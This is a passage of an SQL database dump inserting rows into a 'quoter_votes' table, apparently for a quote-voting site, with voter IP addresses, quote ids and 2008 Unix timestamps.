  (4616,'81.27.49.106','',0,106,1229406250),
  (4617,'80.243.71.189','',0,190,1229407041),
  (4618,'212.122.0.90','',0,23,1229407238),
  (4619,'80.243.71.189','',0,191,1229407279),
  (4620,'84.204.216.34','',0,113,1229407436),
  (4621,'80.243.71.189','',0,187,1229407498),
  (4622,'80.243.71.189','',0,186,1229407505),
  (4623,'80.246.21.9','',0,178,1229407634),
  (4624,'80.246.21.9','',0,177,1229407645),
  (4625,'80.246.21.9','',0,173,1229407702),
  (4626,'85.95.145.112','',0,162,1229407962),
  (4627,'80.246.21.9','',0,162,1229408136),
  (4628,'85.95.145.112','',0,138,1229408443),
  (4629,'91.206.146.61','',0,187,1229408518),
  (4630,'91.206.146.61','',0,186,1229408524),
  (4631,'91.206.146.61','',0,188,1229408526),
  (4632,'91.206.146.61','',0,182,1229408564),
  (4633,'91.206.146.61','',0,180,1229408607),
  (4634,'91.206.146.61','',0,179,1229408617),
  (4635,'72.30.65.42','',0,181,1229408680),
  (4636,'72.30.65.42','',0,77,1229408895),
  (4637,'85.95.145.112','',0,107,1229409012),
  (4638,'94.248.99.122','',0,165,1229409242),
  (4639,'85.95.145.112','',0,80,1229409636),
  (4640,'84.17.2.10','',0,192,1229409879),
  (4641,'84.17.2.10','',0,191,1229409952),
  (4642,'84.17.2.10','',0,185,1229409980),
  (4643,'85.95.145.112','',0,63,1229410036),
  (4644,'85.95.145.112','',0,56,1229410103),
  (4645,'91.185.52.196','',0,192,1229412767),
  (4646,'91.185.52.196','',0,187,1229412780),
  (4647,'213.170.74.12','',0,192,1229412791),
  (4648,'213.170.74.12','',0,187,1229412893),
  (4649,'213.170.74.12','',0,186,1229412900),
  (4650,'213.170.74.12','',0,185,1229412905),
  (4651,'213.170.74.12','',0,182,1229412939),
  (4652,'213.170.74.12','',0,181,1229412956),
  (4653,'213.170.74.12','',0,179,1229412958),
  (4654,'213.170.74.12','',0,171,1229412984),
  (4655,'213.170.74.12','',0,168,1229412992),
  (4656,'213.170.74.12','',0,163,1229413002),
  (4657,'213.170.74.12','',0,164,1229413005),
  (4658,'213.170.74.12','',0,162,1229413009),
  (4659,'212.98.169.130','',0,191,1229413453),
  (4660,'217.146.146.246','',0,179,1229413581),
  (4661,'81.200.211.90','',0,191,1229413583),
  (4662,'213.27.39.20','',0,184,1229413622),
  (4663,'217.146.146.246','',0,187,1229414216),
  (4664,'80.243.71.189','',0,190,1229414254),
  (4665,'80.243.71.189','',0,184,1229414319),
  (4666,'80.243.71.189','',0,177,1229414348),
  (4667,'212.98.164.146','',0,185,1229415059),
  (4668,'72.30.65.42','',0,81,1229415829),
  (4669,'84.204.216.34','',0,188,1229416959),
  (4670,'78.24.225.37','',0,185,1229417213),
  (4671,'78.24.225.37','',0,55,1229417230),
  (4672,'78.24.225.37','',0,1,1229417231),
  (4673,'78.24.225.37','',0,29,1229417238),
  (4674,'78.24.225.37','',0,107,1229417267),
  (4675,'72.30.65.42','',0,73,1229417431),
  (4676,'93.84.111.83','',0,192,1229417845),
  (4677,'66.249.66.47','',0,176,1229418215),
  (4678,'80.68.6.181','',0,173,1229418383),
  (4679,'80.89.145.65','',0,147,1229418699),
  (4680,'81.169.225.161','',0,96,1229419031),
  (4681,'81.169.225.161','',0,56,1229419074),
  (4682,'81.169.225.161','',0,120,1229419386),
  (4683,'86.110.187.63','',0,185,1229419633),
  (4684,'91.124.4.26','',0,173,1229420056),
  (4685,'72.30.65.42','',0,80,1229420183),
  (4686,'91.192.32.50','',0,173,1229420516),
  (4687,'91.192.32.50','',0,195,1229420765),
  (4688,'91.192.32.50','',0,133,1229420773),
  (4689,'91.192.32.50','',0,192,1229421131),
  (4690,'91.192.32.50','',0,115,1229421158),
  (4691,'91.192.32.50','',0,194,1229421249),
  (4692,'91.192.32.50','',0,193,1229421264),
  (4693,'91.192.32.50','',0,191,1229421323),
  (4694,'91.192.32.50','',0,190,1229421335),
  (4695,'91.192.32.50','',0,189,1229421350),
  (4696,'194.204.12.40','',0,183,1229421367),
  (4697,'91.192.32.50','',0,188,1229421421),
  (4698,'91.192.32.50','',0,187,1229421455),
  (4699,'91.192.32.50','',0,186,1229421493),
  (4700,'91.192.32.50','',0,185,1229421531),
  (4701,'91.192.32.50','',0,176,1229421634),
  (4702,'91.192.32.50','',0,175,1229421704),
  (4703,'91.192.32.50','',0,165,1229421764),
  (4704,'91.192.32.50','',0,164,1229421777),
  (4705,'91.192.32.50','',0,168,1229421800),
  (4706,'91.192.32.50','',0,161,1229421956),
  (4707,'91.192.32.50','',0,156,1229422089),
  (4708,'91.192.32.50','',0,155,1229422101),
  (4709,'91.192.32.50','',0,154,1229422168),
  (4710,'91.192.32.50','',0,152,1229422250),
  (4711,'91.202.197.79','',0,195,1229423016),
  (4712,'91.202.197.79','',0,194,1229423023),
  (4713,'92.113.54.52','',0,187,1229423049),
  (4714,'213.170.74.12','',0,194,1229423095),
  (4715,'89.218.99.30','',0,195,1229423185),
  (4716,'89.218.99.30','',0,192,1229423220),
  (4717,'91.202.197.79','',0,190,1229423231),
  (4718,'92.113.54.52','',0,185,1229423268),
  (4719,'92.113.54.52','',0,184,1229423290),
  (4720,'92.113.54.52','',0,183,1229423303),
  (4721,'89.218.99.30','',0,172,1229423319),
  (4722,'89.218.99.30','',0,164,1229423322),
  (4723,'92.113.54.52','',0,178,1229423334),
  (4724,'92.113.54.52','',0,173,1229423385),
  (4725,'91.77.157.81','',0,61,1229423521),
  (4726,'91.77.157.81','',0,178,1229423583),
  (4727,'195.238.92.2','',0,185,1229423703),
  (4728,'91.77.157.81','',0,190,1229423813),
  (4729,'91.77.157.81','',0,186,1229423833),
  (4730,'91.77.157.81','',0,192,1229423963),
  (4731,'91.77.157.81','',0,117,1229424068),
  (4732,'81.20.101.202','',0,141,1229424730),
  (4733,'81.20.101.202','',0,140,1229424734),
  (4734,'77.88.30.246','',0,80,1229425789),
  (4735,'84.17.2.10','',0,195,1229427100),
  (4736,'84.17.2.10','',0,186,1229427335),
  (4737,'213.79.112.34','',0,107,1229427464),
  (4738,'84.17.2.10','',0,178,1229427481),
  (4739,'193.93.218.64','',0,197,1229427976),
  (4740,'84.17.2.10','',0,157,1229427979),
  (4741,'72.30.65.42','',0,194,1229428050),
  (4742,'93.178.104.177','',0,93,1229428122),
  (4743,'72.30.65.42','',0,188,1229428130),
  (4744,'72.30.65.42','',0,197,1229428148),
  (4745,'72.30.65.42','',0,191,1229428181),
  (4746,'72.30.65.42','',0,192,1229428206),
  (4747,'72.30.65.42','',0,196,1229428241),
  (4748,'72.30.65.42','',0,189,1229428308),
  (4749,'91.194.163.242','',0,195,1229428688),
  (4750,'72.30.65.42','',0,195,1229428693),
  (4751,'81.18.116.69','',0,195,1229428755),
  (4752,'91.192.32.50','',0,146,1229429202),
  (4753,'91.192.32.50','',0,145,1229429223),
  (4754,'91.192.32.50','',0,143,1229429310),
  (4755,'91.192.32.50','',0,142,1229429348),
  (4756,'91.192.32.50','',0,141,1229429378),
  (4757,'91.192.32.50','',0,140,1229429414),
  (4758,'91.192.32.50','',0,139,1229429440),
  (4759,'91.192.32.50','',0,138,1229429484),
  (4760,'91.192.32.50','',0,137,1229429511),
  (4761,'91.192.32.50','',0,136,1229429529),
  (4762,'91.192.32.50','',0,133,1229429590),
  (4763,'91.192.32.50','',0,125,1229429647),
  (4764,'91.192.32.50','',0,124,1229429664),
  (4765,'91.192.32.50','',0,120,1229429783),
  (4766,'91.192.32.50','',0,119,1229429793),
  (4767,'91.192.32.50','',0,118,1229429884),
  (4768,'91.192.32.50','',0,115,1229429966),
  (4769,'91.192.32.50','',0,114,1229430004),
  (4770,'91.192.32.50','',0,113,1229430030),
  (4771,'91.192.32.50','',0,111,1229430053),
  (4772,'91.192.32.50','',0,110,1229430099),
  (4773,'91.192.32.50','',0,197,1229430150),
  (4774,'213.184.248.166','',0,20,1229430186),
  (4775,'91.192.32.50','',0,195,1229430195),
  (4776,'213.184.248.166','',0,13,1229430246),
  (4777,'213.184.248.166','',0,11,1229430309),
  (4778,'213.184.248.166','',0,9,1229430825),
  (4779,'213.184.248.166','',0,10,1229430830),
  (4780,'77.88.30.246','',0,85,1229430865),
  (4781,'82.207.125.180','',0,119,1229430899),
  (4782,'82.207.125.180','',0,49,1229430914),
  (4783,'82.207.125.180','',0,185,1229430974),
  (4784,'213.184.248.166','',0,8,1229431056),
  (4785,'82.207.125.180','',0,21,1229431075),
  (4786,'82.207.125.180','',0,18,1229431086),
  (4787,'82.207.125.180','',0,56,1229431094),
  (4788,'213.184.248.166','',0,6,1229431201),
  (4789,'213.184.248.166','',0,7,1229431230),
  (4790,'213.184.248.166','',0,4,1229431430),
  (4791,'82.207.125.180','',0,48,1229431464),
  (4792,'213.184.248.166','',0,2,1229431470),
  (4793,'213.184.248.166','',0,1,1229431486),
  (4794,'213.184.248.166','',0,199,1229431611),
  (4795,'213.184.248.166','',0,198,1229431723),
  (4796,'195.158.17.158','',0,155,1229431777),
  (4797,'195.158.17.158','',0,161,1229431791),
  (4798,'85.249.145.190','',0,197,1229431813),
  (4799,'91.192.32.50','',0,198,1229432021),
  (4800,'91.192.32.50','',0,199,1229432029),
  (4801,'91.192.32.50','',0,200,1229432037),
  (4802,'72.30.65.42','',0,193,1229432225),
  (4803,'195.19.37.71','',0,191,1229432874),
  (4804,'85.141.168.218','',0,115,1229433314),
  (4805,'85.141.168.218','',0,79,1229433528),
  (4806,'195.19.37.71','',0,190,1229433678),
  (4807,'72.30.161.243','',0,196,1229433691),
  (4808,'72.30.161.243','',0,191,1229433692),
  (4809,'77.88.30.246','',0,67,1229433906),
  (4810,'77.88.30.246','',0,87,1229433966),
  (4811,'77.88.30.246','',0,86,1229434056),
  (4812,'78.36.169.22','',0,197,1229434341),
  (4813,'77.88.30.246','',0,83,1229434476),
  (4814,'77.88.30.246','',0,81,1229435084),
  (4815,'193.93.218.64','',0,194,1229435370),
  (4816,'72.30.142.229','',0,192,1229435449),
  (4817,'84.204.148.130','',0,192,1229435506),
  (4818,'72.30.142.229','',0,79,1229435905),
  (4819,'83.217.40.75','',0,119,1229436137),
  (4820,'193.41.60.107','',0,157,1229437619),
  (4821,'193.41.60.107','',0,162,1229437713),
  (4822,'89.104.102.23','',0,197,1229438497),
  (4823,'89.104.102.23','',0,195,1229438510),
  (4824,'85.141.168.18','',0,185,1229438873),
  (4825,'85.141.168.18','',0,184,1229438893),
  (4826,'85.141.168.18','',0,189,1229438909),
  (4827,'77.88.30.246','',0,84,1229438913),
  (4828,'85.141.168.18','',0,197,1229438913),
  (4829,'85.141.168.18','',0,199,1229438929),
  (4830,'85.141.168.18','',0,200,1229439060),
  (4831,'81.177.5.158','',0,191,1229439105),
  (4832,'85.141.168.18','',0,191,1229439121),
  (4833,'81.177.5.158','',0,190,1229439142),
  (4834,'81.177.5.158','',0,186,1229439190),
  (4835,'81.177.5.158','',0,185,1229439199),
  (4836,'95.48.22.66','',0,197,1229439891),
  (4837,'95.48.22.66','',0,192,1229439957),
  (4838,'72.30.142.229','',0,190,1229440329),
  (4839,'91.199.178.2','',0,172,1229440494),
  (4840,'77.88.30.246','',0,62,1229440659),
  (4841,'213.79.112.34','',0,182,1229441464),
  (4842,'66.244.206.67','',0,194,1229441550),
  (4843,'77.88.30.246','',0,80,1229443143),
  (4844,'77.88.30.246','',0,74,1229443475),
  (4845,'77.88.30.246','',0,63,1229443536),
  (4846,'193.93.218.64','',0,194,1229443611),
  (4847,'194.158.198.117','',0,195,1229443887),
  (4848,'74.6.17.164','',0,165,1229444607),
  (4849,'83.167.100.202','',0,194,1229445072),
  (4850,'83.167.100.202','',0,195,1229445079),
  (4851,'217.159.130.58','',0,199,1229445101),
  (4852,'217.159.130.58','',0,195,1229445173),
  (4853,'217.159.130.58','',0,189,1229445230),
  (4854,'217.159.130.58','',0,185,1229445265),
  (4855,'195.26.94.26','',0,117,1229445349),
  (4856,'91.124.159.97','',0,185,1229445374),
  (4857,'91.124.159.97','',0,194,1229445394),
  (4858,'195.26.94.26','',0,61,1229445402),
  (4859,'217.159.130.58','',0,181,1229445509),
  (4860,'217.159.130.58','',0,118,1229445570),
  (4861,'212.98.163.238','',0,200,1229445907),
  (4862,'99.225.110.101','',0,61,1229445929),
  (4863,'93.125.65.230','',0,54,1229446125),
  (4864,'77.88.30.246','',0,88,1229447026),
  (4865,'93.185.182.24','',0,200,1229447063),
  (4866,'217.20.160.99','',0,140,1229447322),
  (4867,'92.114.235.103','',0,201,1229447440),
  (4868,'92.114.235.103','',0,87,1229447477),
  (4869,'77.88.30.246','',0,66,1229447909),
  (4870,'66.249.66.47','',0,12,1229448149),
  (4871,'84.109.97.94','',0,193,1229449414),
  (4872,'78.107.255.211','',0,173,1229449529),
  (4873,'78.107.255.211','',0,61,1229449535),
  (4874,'194.145.199.71','',0,185,1229449629),
  (4875,'194.145.199.71','',0,177,1229449708),
  (4876,'194.145.199.71','',0,164,1229449757),
  (4877,'78.107.255.211','',0,145,1229449757),
  (4878,'67.195.37.113','',0,58,1229449798),
  (4879,'78.107.255.211','',0,119,1229449819),
  (4880,'94.253.36.206','',0,173,1229451057),
  (4881,'94.253.36.206','',0,111,1229451333),
  (4882,'94.253.36.206','',0,109,1229451410),
  (4883,'94.253.36.206','',0,107,1229451416),
  (4884,'72.30.81.153','',0,190,1229451834),
  (4885,'195.239.233.36','',0,204,1229452053),
  (4886,'195.239.233.36','',0,203,1229452056),
  (4887,'195.239.233.36','',0,202,1229452078),
  (4888,'195.239.233.36','',0,201,1229452135),
  (4889,'195.239.233.36','',0,200,1229452156),
  (4890,'72.30.81.153','',0,193,1229452245),
  (4891,'195.239.233.36','',0,197,1229452636),
  (4892,'195.239.233.36','',0,184,1229452721),
  (4893,'195.239.233.36','',0,75,1229452742),
  (4894,'195.239.233.36','',0,48,1229452851),
  (4895,'195.239.233.36','',0,21,1229452880),
  (4896,'156.17.237.13','',0,204,1229452885),
  (4897,'156.17.237.13','',0,202,1229452907),
  (4898,'156.17.237.13','',0,201,1229453297),
  (4899,'72.30.81.153','',0,73,1229453678),
  (4900,'84.53.193.194','',0,204,1229454339),
  (4901,'84.53.193.194','',0,203,1229454385),
  (4902,'84.53.193.194','',0,202,1229454405),
  (4903,'84.53.193.194','',0,201,1229454446),
  (4904,'84.53.193.194','',0,195,1229455008),
  (4905,'84.53.193.194','',0,199,1229455043),
  (4906,'84.53.193.194','',0,198,1229455051),
  (4907,'84.53.193.194','',0,200,1229455075),
  (4908,'93.80.190.174','',0,204,1229455160),
  (4909,'93.80.190.174','',0,203,1229455209),
  (4910,'93.80.190.174','',0,202,1229455263),
  (4911,'93.80.190.174','',0,201,1229455328),
  (4912,'93.80.190.174','',0,200,1229455377),
  (4913,'93.80.190.174','',0,197,1229455499),
  (4914,'93.80.190.174','',0,195,1229455541),
  (4915,'72.30.81.153','',0,175,1229455681),
  (4916,'89.104.114.70','',0,154,1229456188),
  (4917,'78.86.113.42','',0,202,1229456223),
  (4918,'87.117.163.118','',0,195,1229456977),
  (4919,'62.182.65.39','',0,190,1229457625),
  (4920,'62.182.65.39','',0,188,1229457640),
  (4921,'92.242.1.108','',0,197,1229458762),
  (4922,'92.242.1.108','',0,195,1229458804),
  (4923,'92.242.1.108','',0,192,1229458830),
  (4924,'81.198.226.109','',0,201,1229459702),
  (4925,'81.198.226.109','',0,159,1229459786),
  (4926,'81.198.226.109','',0,157,1229459810),
  (4927,'156.17.237.13','',0,207,1229460110),
  (4928,'156.17.237.13','',0,205,1229460181),
  (4929,'72.30.81.153','',0,181,1229460530),
  (4930,'84.201.239.96','',0,195,1229460965),
  (4931,'84.201.239.96','',0,197,1229460981),
  (4932,'84.201.239.96','',0,190,1229461003),
  (4933,'156.17.237.13','',0,201,1229461140),
  (4934,'92.113.115.254','',0,200,1229461174),
  (4935,'84.204.88.65','',0,165,1229462776),
  (4936,'84.204.88.65','',0,122,1229462828),
  (4937,'84.204.88.65','',0,96,1229462864),
  (4938,'84.204.88.65','',0,56,1229462895),
  (4939,'72.30.81.153','',0,74,1229463572),
  (4940,'88.147.200.226','',0,202,1229463662),
  (4941,'94.253.17.255','',0,204,1229464286),
  (4942,'94.253.17.255','',0,205,1229464307),
  (4943,'94.253.17.255','',0,206,1229464322),
  (4944,'81.218.137.101','',0,189,1229466787),
  (4945,'81.218.137.101','',0,70,1229467311),
  (4946,'81.218.137.101','',0,208,1229467468),
  (4947,'81.218.137.101','',0,197,1229467498),
  (4948,'93.153.159.52','',0,55,1229467774),
  (4949,'93.153.159.52','',0,29,1229467836),
  (4950,'93.153.159.52','',0,18,1229467857),
  (4951,'93.153.159.52','',0,56,1229467872),
  (4952,'93.153.159.52','',0,120,1229467917),
  (4953,'93.153.159.52','',0,109,1229467996),
  (4954,'93.153.159.52','',0,173,1229468016),
  (4955,'79.171.124.210','',0,117,1229470269),
  (4956,'81.19.66.84','',0,119,1229471127),
  (4957,'81.19.66.84','',0,122,1229471307),
  (4958,'81.19.66.84','',0,125,1229471477),
  (4959,'81.19.66.84','',0,133,1229471971),
  (4960,'81.19.66.84','',0,134,1229471972),
  (4961,'81.19.66.84','',0,135,1229471975),
  (4962,'87.117.163.118','',0,206,1229472085),
  (4963,'81.19.66.84','',0,136,1229472272),
  (4964,'81.19.66.84','',0,137,1229472275),
  (4965,'81.19.66.84','',0,138,1229472575),
  (4966,'81.19.66.84','',0,139,1229472844),
  (4967,'81.19.66.84','',0,140,1229472846),
  (4968,'72.30.142.178','',0,77,1229472864),
  (4969,'81.19.66.84','',0,141,1229473013),
  (4970,'81.19.66.84','',0,142,1229473016),
  (4971,'72.30.142.178','',0,74,1229473689),
  (4972,'80.243.71.189','',0,208,1229475808),
  (4973,'80.243.71.189','',0,207,1229475817),
  (4974,'80.243.71.189','',0,206,1229475939),
  (4975,'80.243.71.189','',0,204,1229476043),
  (4976,'80.243.71.189','',0,203,1229476196),
  (4977,'80.243.71.189','',0,202,1229476204),
  (4978,'80.243.71.189','',0,201,1229476216),
  (4979,'80.243.71.189','',0,200,1229476233),
  (4980,'80.243.71.189','',0,199,1229476263),
  (4981,'80.243.71.189','',0,195,1229476765),
  (4982,'72.30.142.228','',0,176,1229480188),
  (4983,'66.249.66.47','',0,29,1229481822),
  (4984,'66.249.66.47','',0,12,1229485141),
  (4985,'77.88.30.246','',0,63,1229486994),
  (4986,'77.88.30.246','',0,180,1229487013),
  (4987,'77.88.30.246','',0,66,1229487024),
  (4988,'77.88.30.246','',0,93,1229487033),
  (4989,'77.88.30.246','',0,68,1229487400),
  (4990,'77.88.30.246','',0,69,1229487425),
  (4991,'77.88.30.246','',0,181,1229487434),
  (4992,'77.88.30.246','',0,71,1229487482),
  (4993,'77.88.30.246','',0,176,1229487525),
  (4994,'77.88.30.246','',0,134,1229487533),
  (4995,'77.88.30.246','',0,70,1229487553),
  (4996,'77.88.30.246','',0,95,1229487574),
  (4997,'77.88.30.246','',0,98,1229487594),
  (4998,'77.88.30.246','',0,62,1229487608),
  (4999,'77.88.30.246','',0,67,1229487615),
  (5000,'77.88.30.246','',0,100,1229487641);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 5000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (5001,'77.88.30.246','',0,96,1229487660),
  (5002,'77.88.30.246','',0,182,1229487677),
  (5003,'77.88.30.246','',0,94,1229487770),
  (5004,'72.30.142.253','',0,188,1229488731),
  (5005,'66.249.66.47','',0,75,1229488800),
  (5006,'84.17.2.10','',0,205,1229494609),
  (5007,'84.17.2.10','',0,203,1229494683),
  (5008,'84.17.2.10','',0,202,1229494700),
  (5009,'84.17.2.10','',0,201,1229494744),
  (5010,'83.239.148.179','',0,195,1229494948),
  (5011,'84.17.2.10','',0,200,1229494999),
  (5012,'84.17.2.10','',0,199,1229495079),
  (5013,'81.200.211.90','',0,202,1229495769),
  (5014,'81.200.211.90','',0,190,1229495807),
  (5015,'81.200.211.90','',0,191,1229495808),
  (5016,'81.200.211.90','',0,192,1229495810),
  (5017,'81.200.211.90','',0,193,1229495811),
  (5018,'81.200.211.90','',0,188,1229495824),
  (5019,'81.200.211.90','',0,183,1229495829),
  (5020,'81.200.211.90','',0,178,1229495832),
  (5021,'81.200.211.90','',0,175,1229495837),
  (5022,'81.200.211.90','',0,173,1229495841),
  (5023,'81.200.211.90','',0,117,1229495852),
  (5024,'81.200.211.90','',0,102,1229495857),
  (5025,'81.200.211.90','',0,61,1229495870),
  (5026,'80.243.71.189','',0,208,1229496213),
  (5027,'83.239.148.179','',0,7,1229497059),
  (5028,'80.243.71.189','',0,206,1229497389),
  (5029,'213.79.112.34','',0,209,1229497612),
  (5030,'66.249.66.47','',0,145,1229498388),
  (5031,'66.249.66.47','',0,12,1229499058),
  (5032,'80.243.71.189','',0,195,1229499864),
  (5033,'80.243.71.189','',0,202,1229499887),
  (5034,'80.243.71.189','',0,140,1229499960),
  (5035,'80.243.71.189','',0,109,1229499963),
  (5036,'80.243.71.189','',0,173,1229499971),
  (5037,'80.243.71.189','',0,111,1229500033),
  (5038,'80.243.71.189','',0,133,1229500034),
  (5039,'92.112.28.51','',0,209,1229500188),
  (5040,'80.243.71.189','',0,55,1229500935),
  (5041,'80.243.71.189','',0,1,1229500937),
  (5042,'80.243.71.189','',0,21,1229501000),
  (5043,'193.232.92.242','',0,119,1229501550),
  (5044,'193.232.92.242','',0,79,1229501591),
  (5045,'193.232.92.242','',0,56,1229501592),
  (5046,'217.159.130.58','',0,202,1229504875),
  (5047,'217.159.130.58','',0,210,1229504894),
  (5048,'78.24.224.130','',0,55,1229505080),
  (5049,'78.24.224.130','',0,1,1229505081),
  (5050,'91.192.32.50','',0,204,1229505877),
  (5051,'91.192.32.50','',0,205,1229505930),
  (5052,'84.17.2.10','',0,209,1229505962),
  (5053,'91.192.32.50','',0,206,1229505994),
  (5054,'91.192.32.50','',0,207,1229506025),
  (5055,'91.192.32.50','',0,208,1229506051),
  (5056,'91.192.32.50','',0,209,1229506100),
  (5057,'91.192.32.50','',0,210,1229506150),
  (5058,'213.79.112.34','',0,180,1229506205),
  (5059,'80.251.136.38','',0,210,1229506406),
  (5060,'195.239.199.218','',0,209,1229506712),
  (5061,'91.202.197.79','',0,204,1229506757),
  (5062,'194.88.211.254','',0,50,1229507313),
  (5063,'62.181.43.238','',0,111,1229507680),
  (5064,'193.93.218.64','',0,209,1229508130),
  (5065,'85.249.145.190','',0,120,1229508183),
  (5066,'82.116.46.212','',0,21,1229508433),
  (5067,'213.170.74.12','',0,210,1229508455),
  (5068,'217.65.14.16','',0,208,1229509221),
  (5069,'217.65.14.16','',0,202,1229509362),
  (5070,'72.30.65.49','',0,90,1229510082),
  (5071,'217.65.14.16','',0,197,1229510174),
  (5072,'67.202.43.229','',0,200,1229510266),
  (5073,'67.202.43.229','',0,201,1229510277),
  (5074,'67.202.43.229','',0,202,1229510288),
  (5075,'72.30.161.222','',0,134,1229510300),
  (5076,'72.30.161.222','',0,87,1229510779),
  (5077,'72.30.161.222','',0,88,1229510819),
  (5078,'80.80.111.200','',0,184,1229511081),
  (5079,'89.162.136.26','',0,133,1229511092),
  (5080,'80.80.111.200','',0,108,1229511102),
  (5081,'195.91.249.124','',0,173,1229511116),
  (5082,'89.162.136.26','',0,111,1229511117),
  (5083,'195.91.249.124','',0,55,1229511127),
  (5084,'195.91.249.124','',0,1,1229511131),
  (5085,'195.91.249.124','',0,21,1229511135),
  (5086,'195.91.249.124','',0,29,1229511139),
  (5087,'195.91.249.124','',0,18,1229511145),
  (5088,'195.91.249.124','',0,56,1229511150),
  (5089,'195.91.249.124','',0,120,1229511155),
  (5090,'195.91.249.124','',0,140,1229511163),
  (5091,'195.91.249.124','',0,109,1229511167),
  (5092,'195.234.72.66','',0,185,1229511248),
  (5093,'82.207.125.180','',0,184,1229511361),
  (5094,'67.202.43.229','',0,204,1229511645),
  (5095,'67.202.43.229','',0,205,1229511654),
  (5096,'67.202.43.229','',0,206,1229511664),
  (5097,'67.202.43.229','',0,207,1229511674),
  (5098,'67.202.43.229','',0,208,1229511684),
  (5099,'72.30.65.23','',0,76,1229512687),
  (5100,'67.202.43.229','',0,203,1229514450),
  (5101,'91.192.32.50','',0,197,1229514474),
  (5102,'91.192.32.50','',0,195,1229514480),
  (5103,'91.192.32.50','',0,200,1229514495),
  (5104,'91.192.32.50','',0,202,1229514508),
  (5105,'91.192.32.50','',0,199,1229514572),
  (5106,'213.243.93.202','',0,197,1229515000),
  (5107,'213.243.93.202','',0,195,1229515013),
  (5108,'74.6.22.170','',0,89,1229515227),
  (5109,'91.192.32.50','',0,212,1229517194),
  (5110,'194.44.221.46','',0,212,1229517728),
  (5111,'81.18.116.69','',0,210,1229518553),
  (5112,'80.250.173.139','',0,212,1229518903),
  (5113,'89.250.164.202','',0,202,1229519019),
  (5114,'89.250.164.202','',0,193,1229519029),
  (5115,'89.250.164.202','',0,173,1229519202),
  (5116,'89.250.164.202','',0,106,1229519400),
  (5117,'89.250.164.202','',0,61,1229519449),
  (5118,'91.149.109.107','',0,212,1229519949),
  (5119,'91.185.55.250','',0,212,1229520120),
  (5120,'94.77.62.115','',0,205,1229520222),
  (5121,'84.204.148.130','',0,205,1229522153),
  (5122,'84.204.148.130','',0,202,1229522164),
  (5123,'91.205.168.208','',0,56,1229522248),
  (5124,'91.205.168.208','',0,173,1229522321),
  (5125,'91.202.197.79','',0,212,1229522586),
  (5126,'156.17.18.42','',0,212,1229523375),
  (5127,'89.18.136.242','',0,24,1229523902),
  (5128,'89.18.136.242','',0,23,1229523917),
  (5129,'72.30.79.60','',0,86,1229524413),
  (5130,'62.221.49.72','',0,212,1229524750),
  (5131,'62.221.49.72','',0,202,1229525038),
  (5132,'194.44.221.46','',0,193,1229526145),
  (5133,'194.44.221.46','',0,192,1229526174),
  (5134,'194.44.221.46','',0,191,1229526188),
  (5135,'92.54.120.166','',0,202,1229526217),
  (5136,'194.44.221.46','',0,185,1229526241),
  (5137,'92.54.120.166','',0,191,1229526316),
  (5138,'195.26.93.146','',0,203,1229527283),
  (5139,'190.166.66.68','',0,205,1229527296),
  (5140,'190.166.66.68','',0,202,1229527300),
  (5141,'190.166.66.68','',0,212,1229527304),
  (5142,'190.166.66.68','',0,206,1229527308),
  (5143,'190.166.66.68','',0,201,1229527313),
  (5144,'190.166.66.68','',0,207,1229527316),
  (5145,'78.36.99.64','',0,193,1229528096),
  (5146,'217.159.130.58','',0,210,1229528166),
  (5147,'89.188.114.72','',0,208,1229528428),
  (5148,'213.184.248.166','',0,197,1229529827),
  (5149,'213.184.248.166','',0,7,1229529851),
  (5150,'156.17.18.42','',0,201,1229529920),
  (5151,'213.184.248.166','',0,8,1229530012),
  (5152,'213.184.248.166','',0,9,1229530025),
  (5153,'213.184.248.166','',0,10,1229530174),
  (5154,'213.184.248.166','',0,13,1229530202),
  (5155,'213.184.248.166','',0,210,1229530240),
  (5156,'213.184.248.166','',0,208,1229530291),
  (5157,'79.173.104.18','',0,183,1229530331),
  (5158,'213.184.248.166','',0,206,1229530382),
  (5159,'213.184.248.166','',0,204,1229530448),
  (5160,'195.26.92.114','',0,29,1229530544),
  (5161,'195.26.92.114','',0,18,1229530576),
  (5162,'213.184.248.166','',0,201,1229531481),
  (5163,'213.184.248.166','',0,200,1229531524),
  (5164,'213.184.248.166','',0,198,1229531574),
  (5165,'74.6.22.93','',0,86,1229531956),
  (5166,'82.144.198.134','',0,210,1229532546),
  (5167,'82.144.198.134','',0,212,1229532693),
  (5168,'79.165.45.16','',0,210,1229533515),
  (5169,'217.195.82.2','',0,193,1229534079),
  (5170,'217.195.82.2','',0,183,1229534133),
  (5171,'94.50.215.61','',0,212,1229534386),
  (5172,'89.188.114.72','',0,212,1229535190),
  (5173,'93.172.195.24','',0,212,1229535922),
  (5174,'195.26.92.114','',0,202,1229536030),
  (5175,'195.26.92.114','',0,200,1229536125),
  (5176,'195.26.92.114','',0,197,1229536165),
  (5177,'87.250.208.77','',0,197,1229536189),
  (5178,'195.26.92.114','',0,194,1229536237),
  (5179,'87.250.208.77','',0,195,1229536285),
  (5180,'195.26.92.114','',0,184,1229536343),
  (5181,'195.26.92.114','',0,178,1229536362),
  (5182,'195.26.92.114','',0,173,1229536426),
  (5183,'87.250.208.77','',0,185,1229536443),
  (5184,'195.26.92.114','',0,164,1229536462),
  (5185,'87.250.208.77','',0,178,1229536492),
  (5186,'195.26.92.114','',0,162,1229536632),
  (5187,'195.26.92.114','',0,156,1229536653),
  (5188,'87.250.208.77','',0,165,1229536714),
  (5189,'195.26.92.114','',0,141,1229536745),
  (5190,'195.26.92.114','',0,136,1229536849),
  (5191,'72.30.87.116','',0,85,1229537982),
  (5192,'92.50.248.33','',0,200,1229541434),
  (5193,'92.50.248.33','',0,199,1229541442),
  (5194,'92.50.248.33','',0,195,1229541447),
  (5195,'92.50.248.33','',0,197,1229541451),
  (5196,'72.30.161.216','',0,83,1229542621),
  (5197,'193.254.219.113','',0,140,1229543778),
  (5198,'81.94.17.93','',0,210,1229544462),
  (5199,'81.94.17.93','',0,212,1229544466),
  (5200,'81.94.17.93','',0,109,1229544704),
  (5201,'81.94.17.93','',0,119,1229544708),
  (5202,'81.94.17.93','',0,141,1229544721),
  (5203,'81.94.17.93','',0,107,1229544747),
  (5204,'81.94.17.93','',0,115,1229544759),
  (5205,'195.26.92.114','',0,107,1229545629),
  (5206,'91.77.157.81','',0,208,1229546694),
  (5207,'91.77.157.81','',0,206,1229546762),
  (5208,'91.77.157.81','',0,202,1229546827),
  (5209,'91.77.157.81','',0,190,1229546874),
  (5210,'91.77.157.81','',0,178,1229546919),
  (5211,'91.77.157.81','',0,117,1229546939),
